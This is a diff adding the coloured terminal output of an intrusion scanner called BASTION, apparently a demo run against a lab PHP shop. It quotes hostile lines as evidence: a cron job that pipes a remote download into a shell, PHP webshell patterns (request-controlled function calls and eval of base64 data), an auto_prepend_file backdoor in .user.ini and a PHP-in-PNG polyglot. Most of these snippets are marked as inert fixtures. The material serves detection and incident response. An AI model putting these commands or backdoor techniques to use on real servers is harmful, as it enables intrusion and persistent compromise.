@@ -1,0 +1,113 @@
+
+  [38;5;117m▲[0m [1m[38;5;255mBASTION[0m[0m  [38;5;240mdev · intrusion trace[0m
+  [38;5;240mhost[0m /tmp/bastion-lab[38;5;240m  ·  [0m[38;5;240mos[0m Debian GNU/Linux 12 (bookworm)[38;5;240m  ·  [0m[38;5;240mwindow[0m since 2016-10-24[38;5;240m  ·  [0m[38;5;240mat[0m 2026-10-22 07:12 UTC
+
+  [1;38;5;232;48;5;203m COMPROMISE INDICATORS FOUND [0m
+  [38;5;245mStrong indicators of compromise. Treat the server as breached: preserve evidence (copy files and[0m
+  [38;5;245mlogs before changing anything), rotate credentials, and rebuild from a known-good source.[0m
+
+  [1m[38;5;255mSCOPE[0m[0m [38;5;240m──────────────────────────────────────────────────────────────────────────────────────────────[0m
+
+  [38;5;240mWEB ROOT[0m  [38;5;240mFILES[0m  [38;5;240mFOUND VIA[0m
+  /var/www  9      default
+  [38;5;240m9 files (7 PHP, 7 changed in window) · 905 B read · 2 log files, 9 lines[0m
+
+  [1m[38;5;255mFINDINGS[0m[0m [38;5;240m───────────────────────────────────────────────────────────────────────────────────────────[0m
+
+  [38;5;203m▲ HIGH  [0m  [1mRequests to a flagged file[0m [38;5;240m[log.flagged-file-access][0m
+            [38;5;117m/var/log/nginx/shop.access.log[0m [38;5;240m×4[0m [38;5;240m2026-10-22 02:09[0m
+            [38;5;240m│[0m [38;5;255m198.51.100.23 - - [21/Oct/2026:16:0…2026/10/thumb.php HTTP/1.1" 200 31 "-" "Mozilla/5.0"[0m
+            [38;5;240m│[0m [38;5;245mThe file /var/www/shop/public/wp-content/uploads/2026/10/thumb.php was flagged by the[0m
+            [38;5;240m│[0m [38;5;245mfile scan and was requested over HTTP.[0m
+            [38;5;240m│[0m [38;5;240mfile /var/www/shop/public/wp-content/uploads/2026/10/thumb.php[0m
+            [38;5;240m│[0m [38;5;240mfile /var/www/shop/public/lib/compat.php[0m
+            [38;5;240m│[0m [38;5;240mfirst 2026-10-21T16:04:20Z, last 2026-10-22T02:09:41Z[0m
+            [38;5;240m│[0m [38;5;240m… 5 more (use -v or --json)[0m
+
+  [38;5;203m▲ HIGH  [0m  [1mSuccessful POST to a PHP file in an upload directory[0m [38;5;240m[log.post-upload-php][0m
+            [38;5;117m/var/log/nginx/shop.access.log[0m [38;5;240m×1[0m [38;5;240m2026-10-21 16:04[0m
+            [38;5;240m│[0m [38;5;255m198.51.100.23 - - [21/Oct/2026:16:0…2026/10/thumb.php HTTP/1.1" 200 31 "-" "Mozilla/5.0"[0m
+            [38;5;240m│[0m [38;5;245mLegitimate applications do not execute PHP from upload directories.[0m
+            [38;5;240m│[0m [38;5;240mfirst 2026-10-21T16:04:20Z, last 2026-10-21T16:04:20Z[0m
+            [38;5;240m│[0m [38;5;240mtop clients: 198.51.100.23×1[0m
+            [38;5;240m│[0m [38;5;240mstatus codes: 200×1[0m
+            [38;5;240m│[0m [38;5;240m… 1 more (use -v or --json)[0m
+
+  [38;5;203m▲ HIGH  [0m  [1mSuspicious scheduled task[0m [38;5;240m[persist.cron][0m
+            [38;5;117m/var/spool/cron/crontabs/www-data:1[0m [38;5;240m2026-10-21 16:09[0m
+            [38;5;240m│[0m [38;5;255m*/10 * * * * curl -fsSL http://198.51.100.23/u | sh[0m
+            [38;5;240m│[0m [38;5;245mLine downloads and pipes into a shell.[0m
+
+  [38;5;203m▲ HIGH  [0m  [1mPHP auto_prepend/append_file set in .user.ini[0m [38;5;240m[config.auto-prepend][0m
+            [38;5;117m/var/www/shop/public/.user.ini:1[0m [38;5;240m2026-10-21 16:06[0m
+            [38;5;240m│[0m [38;5;255mauto_prepend_file = /var/www/shop/public/img/.cache.png [0m
+            [38;5;240m│[0m [38;5;245mEvery request on this directory first runs /var/www/shop/public/img/.cache.png. A[0m
+            [38;5;240m│[0m [38;5;245mfavourite way to keep a backdoor loaded.[0m
+
+  [38;5;203m▲ HIGH  [0m  [1mFunction name taken from the request[0m [38;5;240m[php.request-callable][0m
+            [38;5;117m/var/www/shop/public/lib/compat.php:1[0m [38;5;240m2026-10-21 16:05[0m
+            [38;5;240m│[0m [38;5;255m… demo fixture — inert */ if (false) { $_POST['k']($_POST['v']); } [0m
+            [38;5;240m│[0m [38;5;245m$_POST['x']($_POST['y']) lets the attacker call any function.[0m
+            [38;5;240m│[0m [38;5;240mrequested over HTTP (see /var/log/nginx/shop.access.log)[0m
+
+  [38;5;203m▲ HIGH  [0m  [1meval/assert of decoded data[0m [38;5;240m[php.eval-decoded][0m
+            [38;5;117m/var/www/shop/public/wp-content/uploads/2026/10/thumb.php:1[0m [38;5;240m2026-10-21 16:04[0m
+            [38;5;240m│[0m [38;5;255m… demo fixture — inert */ if (false) { eval(base64_decode('ZGVtbw==')); } [0m
+            [38;5;240m│[0m [38;5;245mExecuting decoded strings is the classic packer used by webshells to hide their payload.[0m
+            [38;5;240m│[0m [38;5;240mlocated in an upload/cache directory[0m
+            [38;5;240m│[0m [38;5;240mrequested over HTTP (see /var/log/nginx/shop.access.log)[0m
+
+  [38;5;214m◆ MEDIUM[0m  [1mShell commands passed as request parameters[0m [38;5;240m[log.command-param][0m
+            [38;5;117m/var/log/nginx/shop.access.log[0m [38;5;240m×1[0m [38;5;240m2026-10-21 16:07[0m
+            [38;5;240m│[0m [38;5;255m198.51.100.23 - - [21/Oct/2026:16:0…mpat.php?cmd=whoami HTTP/1.1" 200 9 "-" "curl/8.5.0"[0m
+            [38;5;240m│[0m [38;5;245mTypical of interacting with a webshell.[0m
+            [38;5;240m│[0m [38;5;240mfirst 2026-10-21T16:07:55Z, last 2026-10-21T16:07:55Z[0m
+            [38;5;240m│[0m [38;5;240mtop clients: 198.51.100.23×1[0m
+            [38;5;240m│[0m [38;5;240mstatus codes: 200×1[0m
+            [38;5;240m│[0m [38;5;240m… 1 more (use -v or --json)[0m
+
+  [38;5;214m◆ MEDIUM[0m  [1mOut-of-memory during request start-up[0m [38;5;240m[log.early-oom][0m
+            [38;5;117m/var/log/php8.2-fpm.log[0m [38;5;240m×1[0m [38;5;240m2026-10-21 16:01[0m
+            [38;5;240m│[0m [38;5;255m[21-Oct-2026 16:01:07] PHP Fatal er…(tried to allocate 20480 bytes) in Unknown on line 0[0m
+            [38;5;240m│[0m [38;5;245m'in Unknown on line 0' means memory ran out before any script ran — while PHP was[0m
+            [38;5;240m│[0m [38;5;245mparsing the request. That is the trigger condition of CVE-2026-109618.[0m
+            [38;5;240m│[0m [38;5;240mfirst 2026-10-21T16:01:07Z, last 2026-10-21T16:01:07Z[0m
+            [38;5;240m│[0m [38;5;240m[21-Oct-2026 16:01:07] PHP Fatal er…(tried to allocate 20480 bytes) in Unknown on line 0[0m
+
+  [38;5;214m◆ MEDIUM[0m  [1mPHP worker crashes (segfault / heap corruption)[0m [38;5;240m[log.worker-crash][0m
+            [38;5;117m/var/log/php8.2-fpm.log[0m [38;5;240m×3[0m [38;5;240m2026-10-21 16:03[0m
+            [38;5;240m│[0m [38;5;255m[21-Oct-2026 15:58:41] WARNING: [po…gnal 11 (SIGSEGV) after 41.200713 seconds from start[0m
+            [38;5;240m│[0m [38;5;245mPHP2Shell is a memory-corruption bug; exploitation attempts often crash workers before[0m
+            [38;5;240m│[0m [38;5;245mthey succeed. Crashes also happen for benign reasons — check timing against suspicious[0m
+            [38;5;240m│[0m [38;5;245mrequests.[0m
+            [38;5;240m│[0m [38;5;240mfirst 2026-10-21T15:58:41Z, last 2026-10-21T16:03:09Z[0m
+            [38;5;240m│[0m [38;5;240m[21-Oct-2026 15:58:41] WARNING: [po…gnal 11 (SIGSEGV) after 41.200713 seconds from start[0m
+            [38;5;240m│[0m [38;5;240m[21-Oct-2026 15:58:43] WARNING: [po…ignal 11 (SIGSEGV) after 2.004112 seconds from start[0m
+            [38;5;240m│[0m [38;5;240m… 1 more (use -v or --json)[0m
+
+  [38;5;214m◆ MEDIUM[0m  [1mPHP code hidden in an image file[0m [38;5;240m[file.php-in-image][0m
+            [38;5;117m/var/www/shop/public/img/.cache.png:3[0m [38;5;240m2026-10-21 16:05[0m
+            [38;5;240m│[0m [38;5;255m·PNG  · <?php /* demo fixture — inert */ ?>[0m
+            [38;5;240m│[0m [38;5;245mPolyglot images are used with include() or a handler override to run code.[0m
+
+  [1m[38;5;255mTIMELINE[0m[0m [38;5;240m───────────────────────────────────────────────────────────────────────────────────────────[0m
+
+  [38;5;255m2026-10-21[0m
+  [38;5;240m├─[0m [38;5;245m15:58:41[0m [38;5;214m●[0m [38;5;240mlog        [0m PHP worker crashes (segfaul… seen (3 total)  /var/log/php8.2-fpm.log
+  [38;5;240m├─[0m [38;5;245m16:01:07[0m [38;5;214m●[0m [38;5;240mlog        [0m Out-of-memory during reques… seen (1 total)  /var/log/php8.2-fpm.log
+  [38;5;240m├─[0m [38;5;245m16:03:09[0m [38;5;214m●[0m [38;5;240mlog        [0m PHP worker crashes (segfaul…on) — last seen  /var/log/php8.2-fpm.log
+  [38;5;240m├─[0m [38;5;245m16:04:11[0m [38;5;203m●[0m [38;5;240mfile       [0m flagged file last modified:…lic/wp-content/uploads/2026/10/thumb.php
+  [38;5;240m├─[0m [38;5;245m16:04:20[0m [38;5;203m●[0m [38;5;240mlog        [0m Requests to a flagged file …4 total)  /var/log/nginx/shop.access.log
+  [38;5;240m├─[0m [38;5;245m16:04:20[0m [38;5;203m●[0m [38;5;240mlog        [0m Successful POST to a PHP fi…1 total)  /var/log/nginx/shop.access.log
+  [38;5;240m├─[0m [38;5;245m16:05:02[0m [38;5;203m●[0m [38;5;240mfile       [0m flagged file last modified:…est  /var/www/shop/public/lib/compat.php
+  [38;5;240m├─[0m [38;5;245m16:05:40[0m [38;5;214m●[0m [38;5;240mfile       [0m flagged file last modified:…ile  /var/www/shop/public/img/.cache.png
+  [38;5;240m├─[0m [38;5;245m16:06:15[0m [38;5;203m●[0m [38;5;240mfile       [0m flagged file last modified:…user.ini  /var/www/shop/public/.user.ini
+  [38;5;240m├─[0m [38;5;245m16:07:55[0m [38;5;214m●[0m [38;5;240mlog        [0m Shell commands passed as re…1 total)  /var/log/nginx/shop.access.log
+  [38;5;240m└─[0m [38;5;245m16:09:30[0m [38;5;203m●[0m [38;5;240mpersistence[0m Suspicious scheduled task (…hell)  /var/spool/cron/crontabs/www-data
+  [38;5;255m2026-10-22[0m
+  [38;5;240m└─[0m [38;5;245m02:09:41[0m [38;5;203m●[0m [38;5;240mlog        [0m Requests to a flagged file …ast seen  /var/log/nginx/shop.access.log
+
+
+  [1mSUMMARY[0m  [38;5;203m6 high[0m  [38;5;214m4 medium[0m  [38;5;111m0 low[0m  [38;5;245m0 info[0m
+  [38;5;240mcompleted in 1ms · read-only: nothing was modified[0m
+
